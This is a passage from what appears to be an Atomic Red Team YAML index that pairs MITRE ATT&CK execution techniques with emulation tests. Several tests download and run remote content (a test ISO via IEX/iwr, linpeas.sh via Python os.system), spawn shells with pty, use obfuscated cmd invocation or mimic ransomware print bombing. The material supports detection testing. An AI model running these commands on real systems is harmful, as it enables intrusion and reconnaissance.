        Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs)

        Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: Monitor the local image registry to make sure malicious images
        are not added. Track the deployment of new containers, especially from newly
        built images. Monitor the behavior of containers within the environment to
        detect anomalous behavior or malicious activity after users deploy from malicious
        images.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Container: Container Creation'
      - 'Container: Container Start'
      - 'Instance: Instance Start'
      - 'Instance: Instance Creation'
      - 'Command: Command Execution'
      - 'Image: Image Creation'
      x_mitre_permissions_required:
      - User
      identifier: T1204.003
    atomic_tests:
    - name: Malicious Execution from Mounted ISO Image
      auto_generated_guid: e9795c8d-42aa-4ed4-ad80-551ed793d006
      description: Adversaries may rely on a user running a malicious image to facilitate
        execution
      supported_platforms:
      - windows
      executor:
        command: |-
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso" -OutFile "$env:TEMP\qbot-test.iso")
          Mount-DiskImage -ImagePath "$env:TEMP\qbot-test.iso"
          $mountedpath = (Get-DiskImage -ImagePath "$env:TEMP\qbot-test.iso" | Get-Volume).DriveLetter
          $finalpath = $mountedpath + ":\"
          cd $finalpath
          .\calc.exe.lnk
        cleanup_command: "start-sleep -s 5\nstop-process -Name \"Calculatorapp\" -Force
          \ndismount-diskimage -ImagePath \"$env:TEMP\\qbot-test.iso\""
        name: powershell
        elevation_required: true
  T1154:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--b53dbcc6-147d-48bb-9df4-bcb8bb808ff6
      type: attack-pattern
      created: '2017-12-14T16:46:06.044Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1154
        url: https://attack.mitre.org/techniques/T1154
      - source_name: Trap Manual
        url: https://ss64.com/bash/trap.html
        description: ss64. (n.d.). trap. Retrieved May 21, 2019.
      - source_name: Cyberciti Trap Statements
        url: https://bash.cyberciti.biz/guide/Trap_statement
        description: Cyberciti. (2016, March 29). Trap statement. Retrieved May 21,
          2019.
      modified: '2020-01-24T14:18:13.478Z'
      name: Trap
      description: 'The <code>trap</code> command allows programs and shells to specify
        commands that will be executed upon receiving interrupt signals. A common
        situation is a script allowing for graceful termination and handling of common  keyboard
        interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>. Adversaries can
        use this to register code to be executed when the shell encounters specific
        interrupts either to gain execution or as a persistence mechanism. Trap commands
        are of the following format <code>trap ''command list'' signals</code> where
        "command list" will be executed when "signals" are received.(Citation: Trap
        Manual)(Citation: Cyberciti Trap Statements)'
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      - kill_chain_name: mitre-attack
        phase_name: persistence
      x_mitre_detection: Trap commands must be registered for the shell or programs,
        so they appear in files. Monitoring files for suspicious or overly broad trap
        commands can narrow down suspicious behavior during an investigation. Monitor
        for suspicious processes executed through trap interrupts.
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      - Administrator
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1203:
    technique:
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63
      created: '2018-04-18T17:59:24.739Z'
      x_mitre_version: '1.4'
      external_references:
      - source_name: mitre-attack
        external_id: T1203
        url: https://attack.mitre.org/techniques/T1203
      x_mitre_deprecated: false
      revoked: false
      description: |-
        Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.

        Several types exist:

        ### Browser-based Exploitation

        Web browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.

        ### Office Applications

        Common office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.

        ### Common Third-party Applications

        Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.
      modified: '2022-04-18T18:48:06.141Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Exploitation for Client Execution
      x_mitre_detection: Detecting software exploitation may be difficult depending
        on the tools available. Also look for behavior on the endpoint system that
        might indicate successful compromise, such as abnormal behavior of the browser
        or Office processes. This could include suspicious files written to disk,
        evidence of [Process Injection](https://attack.mitre.org/techniques/T1055)
        for attempts to hide execution, evidence of Discovery, or other unusual network
        traffic that may indicate additional tools transferred to the system.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Application Log: Application Log Content'
      x_mitre_system_requirements:
      - Remote exploitation for execution requires a remotely accessible service reachable
        over the network or other vector of access such as spearphishing or drive-by
        compromise.
      x_mitre_remote_support: false
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1168:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Anastasios Pingios
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--c0a384a4-9a25-40e1-97b6-458388474bc8
      type: attack-pattern
      created: '2017-12-14T16:46:06.044Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1168
        url: https://attack.mitre.org/techniques/T1168
      - url: https://linux.die.net/man/5/crontab
        description: Paul Vixie. (n.d.). crontab(5) - Linux man page. Retrieved December
          19, 2017.
        source_name: Die.net Linux crontab Man Page
      - url: https://linux.die.net/man/1/at
        description: Thomas Koenig. (n.d.). at(1) - Linux man page. Retrieved December
          19, 2017.
        source_name: Die.net Linux at Man Page
      - url: https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/ScheduledJobs.html
        description: Apple. (n.d.). Retrieved July 17, 2017.
        source_name: AppleDocs Scheduling Timed Jobs
      - url: http://www.thesafemac.com/new-signed-malware-called-janicab/
        description: Thomas. (2013, July 15). New signed malware called Janicab. Retrieved
          July 17, 2017.
        source_name: Janicab
      - url: https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf
        description: Patrick Wardle. (2014, September). Methods of Malware Persistence
          on Mac OS X. Retrieved July 5, 2017.
        source_name: Methods of Mac Malware Persistence
      - url: https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf
        description: Patrick Wardle. (2015). Malware Persistence on OS X Yosemite.
          Retrieved July 10, 2017.
        source_name: Malware Persistence on OS X
      - url: https://blog.avast.com/2015/01/06/linux-ddos-trojan-hiding-itself-with-an-embedded-rootkit/
        description: Threat Intelligence Team. (2015, January 6). Linux DDoS Trojan
          hiding itself with an embedded rootkit. Retrieved January 8, 2018.
        source_name: Avast Linux Trojan Cron Persistence
      modified: '2021-03-30T00:51:58.374Z'
      name: Local Job Scheduling
      description: |-
        On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).

        ### cron

        System-wide cron jobs are installed by modifying <code>/etc/crontab</code> file, <code>/etc/cron.d/</code> directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This works on macOS and Linux systems.

        Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) (Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) (Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.

        ### at

        The at program is another means on POSIX-based systems, including macOS and Linux, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.

        ### launchd

        Each launchd job is described by a different configuration property list (plist) file similar to [Launch Daemon](https://attack.mitre.org/techniques/T1160) or [Launch Agent](https://attack.mitre.org/techniques/T1159), except there is an additional key called <code>StartCalendarInterval</code> with a dictionary of time values. (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS and OS X.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: Legitimate scheduled jobs may be created during installation
        of new software or through administration functions. Jobs scheduled with launchd
        and cron can be monitored from their respective utilities to list out detailed
        information about the jobs. Monitor process execution resulting from launchd
        and cron tasks to look for unusual or unknown applications and behavior.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - Administrator
      - User
      - root
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1028:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--c3bce4f4-9795-46c6-976e-8676300bbc39
      type: attack-pattern
      created: '2017-05-31T21:30:33.723Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1028
        url: https://attack.mitre.org/techniques/T1028
      - external_id: CAPEC-555
        source_name: capec
        url: https://capec.mitre.org/data/definitions/555.html
      - url: http://msdn.microsoft.com/en-us/library/aa384426
        description: Microsoft. (n.d.). Windows Remote Management. Retrieved November
          12, 2014.
        source_name: Microsoft WinRM
      - url: https://www.slideshare.net/kieranjacobsen/lateral-movement-with-power-shell-2
        description: Jacobsen, K. (2014, May 16). Lateral Movement with PowerShell&#91;slides&#93;.
          Retrieved November 12, 2014.
        source_name: Jacobsen 2014
      - source_name: Medium Detecting Lateral Movement
        url: https://medium.com/threatpunter/detecting-lateral-movement-using-sysmon-and-splunk-318d3be141bc
        description: French, D. (2018, September 30). Detecting Lateral Movement Using
          Sysmon and Splunk. Retrieved October 11, 2019.
      modified: '2020-02-11T18:30:20.937Z'
      name: Windows Remote Management
      description: 'Windows Remote Management (WinRM) is the name of both a Windows
        service and a protocol that allows a user to interact with a remote system
        (e.g., run an executable, modify the Registry, modify services). (Citation:
        Microsoft WinRM) It may be called with the <code>winrm</code> command or by
        any number of programs such as PowerShell. (Citation: Jacobsen 2014)'
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: 'Monitor use of WinRM within an environment by tracking service
        execution. If it is not normally used or is disabled, then this may be an
        indicator of suspicious behavior. Monitor processes created and actions taken
        by the WinRM process or a WinRM invoked script to correlate it with other
        related events. (Citation: Medium Detecting Lateral Movement)'
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      - Administrator
      x_mitre_system_requirements:
      - WinRM listener turned on and configured on remote system
      x_mitre_remote_support: true
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1059.006:
    technique:
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1
      type: attack-pattern
      created: '2020-03-09T14:38:24.334Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1059.006
        url: https://attack.mitre.org/techniques/T1059/006
      modified: '2021-07-26T22:49:23.094Z'
      name: 'Command and Scripting Interpreter: Python'
      description: |-
        Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.

        Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: |-
        Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

        Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      x_mitre_permissions_required:
      - Administrator
      - SYSTEM
      - root
      x_mitre_system_requirements:
      - Python is installed.
      identifier: T1059.006
    atomic_tests:
    - name: Execute shell script via python's command mode arguement
      auto_generated_guid: 3a95cdb2-c6ea-4761-b24e-02b71889b8bb
      description: Download and execute shell script and write to file then execute
        locally using Python -c (command mode)
      supported_platforms:
      - linux
      input_arguments:
        script_url:
          description: Shell script public URL
          type: string
          default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh
        payload_file_name:
          description: Name of shell script downloaded from the script_url
          type: string
          default: T1059.006-payload
        executor:
          description: Linux shell
          type: string
          default: sh
        script_args:
          description: Arguments to check for system stats, available software, process
            details, environment paths, open sockets, and interesting files.
          type: string
          default: "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI,
            IntFiles"
      dependency_executor_name: sh
      dependencies:
      - description: Verify if python is in the environment variable path and attempt
          to import requests library.
        prereq_command: |
          which_python=$(which python || which python3 || which python2); $which_python -V
          $which_python -c 'import requests' 2>/dev/null; echo $?
        get_prereq_command: 'pip install requests

          '
      executor:
        command: |
          which_python=$(which python || which python3 || which python2)
          $which_python -c 'import requests;import os;url = "#{script_url}";malicious_command = "#{executor} #{payload_file_name} #{script_args}";session = requests.session();source = session.get(url).content;fd = open("#{payload_file_name}", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
        name: sh
        cleanup_command: "rm #{payload_file_name}  \n"
    - name: Execute Python via scripts (Linux)
      auto_generated_guid: 6c4d1dcb-33c7-4c36-a8df-c6cfd0408be8
      description: Create Python file (.py) that downloads and executes shell script
        via executor arguments
      supported_platforms:
      - linux
      input_arguments:
        python_script_name:
          description: Python script name
          type: path
          default: T1059.006.py
        script_url:
          description: Shell script public URL
          type: string
          default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh
        payload_file_name:
          description: Shell script file name downloaded from the script_url
          type: string
          default: T1059.006-payload
        executor:
          description: Payload or script interpreter / executor
          type: string
          default: sh
        script_args:
          description: Arguments to check for system stats, available software, process
            details, environment paths, open sockets, and interesting files
          type: string
          default: "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI,
            IntFiles"
      dependency_executor_name: sh
      dependencies:
      - description: 'Requires Python

          '
        prereq_command: |
          which_python=$(which python || which python3 || which python2); $which_python -V
          $which_python -c 'import requests' 2>/dev/null; echo $?
        get_prereq_command: "pip install requests    \n"
      executor:
        command: |
          which_python=$(which python || which python3 || which python2)
          echo 'import requests' > #{python_script_name}
          echo 'import os' >> #{python_script_name}
          echo 'url = "#{script_url}"' >> #{python_script_name}
          echo 'malicious_command = "#{executor} #{payload_file_name} #{script_args}"' >> #{python_script_name}
          echo 'session = requests.session()' >> #{python_script_name}
          echo 'source = session.get(url).content' >> #{python_script_name}
          echo 'fd = open("#{payload_file_name}", "wb+")' >> #{python_script_name}
          echo 'fd.write(source)' >> #{python_script_name}
          echo 'fd.close()' >> #{python_script_name}
          echo 'os.system(malicious_command)' >> #{python_script_name}
          $which_python #{python_script_name}
        name: sh
        cleanup_command: "rm #{python_script_name} #{payload_file_name}  \n"
    - name: Execute Python via Python executables (Linux)
      auto_generated_guid: 0b44d79b-570a-4b27-a31f-3bf2156e5eaa
      description: 'Create Python file (.py) then compile to binary (.pyc) that downloads
        an external malicious script then executes locally using the supplied executor
        and arguments

        '
      supported_platforms:
      - linux
      input_arguments:
        python_script_name:
          description: Name of Python script name
          type: path
          default: T1059.006.py
        script_url:
          description: URL hosting external malicious payload
          type: string
          default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh
        payload_file_name:
          description: Shell script file name downloaded from the script_url
          type: string
          default: T1059.006-payload
        executor:
          description: Payload or script interpreter / executor
          type: string
          default: sh
        script_args:
          description: Arguments to check for system stats, available software, process
            details, environment paths, open sockets, and interesting files
          type: string
          default: "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI,
            IntFiles"
        python_binary_name:
          description: Name of Python file to be compiled
          type: path
          default: T1059.006.pyc
      dependency_executor_name: sh
      dependencies:
      - description: 'Requires Python

          '
        prereq_command: |
          which_python=$(which python || which python3 || which python2); $which_python -V
          $which_python -c 'import requests' 2>/dev/null; echo $?
        get_prereq_command: "pip install requests    \n"
      executor:
        command: |
          which_python=$(which python || which python3 || which python2)
          echo 'import requests' > #{python_script_name}
          echo 'import os' >> #{python_script_name}
          echo 'url = "#{script_url}"' >> #{python_script_name}
          echo 'malicious_command = "#{executor} #{payload_file_name} #{script_args}"' >> #{python_script_name}
          echo 'session = requests.session()' >> #{python_script_name}
          echo 'source = session.get(url).content' >> #{python_script_name}
          echo 'fd = open("#{payload_file_name}", "wb+")' >> #{python_script_name}
          echo 'fd.write(source)' >> #{python_script_name}
          echo 'fd.close()' >> #{python_script_name}
          echo 'os.system(malicious_command)' >> #{python_script_name}
          $which_python -c 'import py_compile; py_compile.compile("#{python_script_name}", "#{python_binary_name}")'
          $which_python #{python_binary_name}
        name: sh
        cleanup_command: 'rm #{python_binary_name} #{python_script_name} #{payload_file_name}

          '
    - name: Python pty module and spawn function used to spawn sh or bash
      auto_generated_guid: 161d694c-b543-4434-85c3-c3a433e33792
      description: 'Uses the Python spawn function to spawn a sh shell followed by
        a bash shell. Per Volexity, this technique was observed in exploitation of
        Atlassian Confluence [CVE-2022-26134]. Reference: https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence

        '
      supported_platforms:
      - linux
      dependencies:
      - description: 'Verify if python is in the environment variable path and attempt
          to import requests library.

          '
        prereq_command: "which_python=$(which python || which python3 || which python2);
          $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?
          \         \n"
        get_prereq_command: 'pip install requests

          '
      executor:
        command: |-
          which_python=$(which python || which python3 || which python2)
          $which_python -c "import pty;pty.spawn('/bin/sh')"
          exit
          $which_python -c "import pty;pty.spawn('/bin/bash')"
          exit
        name: bash
  T1569:
    technique:
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253
      type: attack-pattern
      created: '2020-03-10T18:23:06.482Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1569
        url: https://attack.mitre.org/techniques/T1569
      modified: '2022-03-22T17:29:46.189Z'
      name: System Services
      description: Adversaries may abuse system services or daemons to execute commands
        or programs. Adversaries can execute malicious content by interacting with
        or creating services either locally or remotely. Many services are set to
        run at boot, which can aid in achieving persistence ([Create or Modify System
        Process](https://attack.mitre.org/techniques/T1543)), but adversaries can
        also abuse services for one-time or temporary execution.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: Monitor for command line invocations of tools capable of
        modifying services that doesn’t correspond to normal usage patterns and known
        software, patch cycles, etc. Also monitor for changes to executables and other
        files associated with services. Changes to Windows services may also be reflected
        in the Registry.
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'File: File Modification'
      - 'Windows Registry: Windows Registry Key Modification'
      - 'Command: Command Execution'
      - 'Service: Service Creation'
      x_mitre_permissions_required:
      - User
      - Administrator
      - SYSTEM
      - root
      x_mitre_remote_support: true
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1059.003:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62
      type: attack-pattern
      created: '2020-03-09T14:12:31.196Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1059.003
        url: https://attack.mitre.org/techniques/T1059/003
      - source_name: SSH in Windows
        url: https://docs.microsoft.com/en-us/windows/terminal/tutorials/ssh
        description: 'Microsoft. (2020, May 19). Tutorial: SSH in Windows Terminal.
          Retrieved July 26, 2021.'
      modified: '2021-07-26T17:13:07.345Z'
      name: 'Command and Scripting Interpreter: Windows Command Shell'
      description: |-
        Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)

        Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

        Adversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: |-
        Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

        Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      x_mitre_permissions_required:
      - User
      x_mitre_remote_support: true
      identifier: T1059.003
    atomic_tests:
    - name: Create and Execute Batch Script
      auto_generated_guid: 9e8894c0-50bd-4525-a96c-d4ac78ece388
      description: 'Creates and executes a simple batch script. Upon execution, CMD
        will briefly launch to run the batch script then close again.

        '
      supported_platforms:
      - windows
      input_arguments:
        command_to_execute:
          description: Command to execute within script.
          type: string
          default: dir
        script_path:
          description: Script path.
          type: path
          default: "$env:TEMP\\T1059.003_script.bat"
      dependency_executor_name: powershell
      dependencies:
      - description: 'Batch file must exist on disk at specified location (#{script_path})

          '
        prereq_command: 'if (Test-Path #{script_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item #{script_path} -Force | Out-Null
          Set-Content -Path #{script_path} -Value "#{command_to_execute}"
      executor:
        command: 'Start-Process #{script_path}

          '
        cleanup_command: 'Remove-Item #{script_path} -Force -ErrorAction Ignore

          '
        name: powershell
    - name: Writes text to a file and displays it.
      auto_generated_guid: 127b4afe-2346-4192-815c-69042bec570e
      description: 'Writes text to a file and display the results. This test is intended
        to emulate the dropping of a malicious file to disk.

        '
      supported_platforms:
      - windows
      input_arguments:
        file_contents_path:
          description: Path to the file that the command prompt will drop.
          type: path
          default: "%TEMP%\\test.bin"
        message:
          description: Message that will be written to disk and then displayed.
          type: string
          default: Hello from the Windows Command Prompt!
      executor:
        command: 'echo "#{message}" > "#{file_contents_path}" & type "#{file_contents_path}"

          '
        cleanup_command: 'del "#{file_contents_path}" >nul 2>&1

          '
        name: command_prompt
    - name: Suspicious Execution via Windows Command Shell
      auto_generated_guid: d0eb3597-a1b3-4d65-b33b-2cda8d397f20
      description: 'Command line executed via suspicious invocation. Example is from
        the 2021 Threat Detection Report by Red Canary.

        '
      supported_platforms:
      - windows
      input_arguments:
        output_file:
          description: File to output to
          type: string
          default: hello.txt
        input_message:
          description: Message to write to file
          type: string
          default: Hello, from CMD!
      executor:
        command: "%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file}
          & type #{output_file}\n"
        name: command_prompt
    - name: Simulate BlackByte Ransomware Print Bombing
      auto_generated_guid: 6b2903ac-8f36-450d-9ad5-b220e8a2dcb9
      description: "This test attempts to open a file a specified number of times
        in Wordpad, then prints the contents. \nIt is designed to mimic BlackByte
        ransomware's print bombing technique, where tree.dll, which contains the ransom
        note, is opened in Wordpad 75 times and then printed. \nSee https://redcanary.com/blog/blackbyte-ransomware/.
        \n"
      supported_platforms:
      - windows
      input_arguments:
        file_to_print:
          description: File to be opened/printed by Wordpad.
          type: string
          default: "$env:temp\\T1059_003note.txt"
        max_to_print:
          description: The maximum number of Wordpad windows the test will open/print.
          type: integer
          default: 75
      dependency_executor_name: powershell
      dependencies:
      - description: 'File to print must exist on disk at specified location (#{file_to_print})

          '
        prereq_command: 'if (test-path "#{file_to_print}"){exit 0} else {exit 1}

          '
        get_prereq_command: 'new-item #{file_to_print} -value "This file has been
          created by T1059.003 Test 4" -Force | Out-Null

          '
      executor:
        command: 'cmd /c "for /l %x in (1,1,#{max_to_print}) do start wordpad.exe
          /p #{file_to_print}" | out-null

          '
        cleanup_command: 'stop-process -name wordpad -force -erroraction silentlycontinue

          '
        name: powershell
    - name: Command Prompt read contents from CMD file and execute
      auto_generated_guid: df81db1b-066c-4802-9bc8-b6d030c3ba8e
      description: "Simulate Raspberry Robin using the \"standard-in\" command prompt
        feature cmd `/R <` to read and execute a file via cmd.exe\nSee https://redcanary.com/blog/raspberry-robin/.
        \n"
      supported_platforms:
      - windows
      input_arguments:
        input_file:
          description: CMD file that is read by Command Prompt and execute, which
            launches calc.exe
          type: path
          default: PathToAtomicsFolder\T1059.003\src\t1059.003_cmd.cmd
      dependency_executor_name: powershell
      dependencies:
      - description: 'CMD file must exist on disk at specified location (#{input_file})

          '
        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{input_file}) -ErrorAction ignore | Out-Null
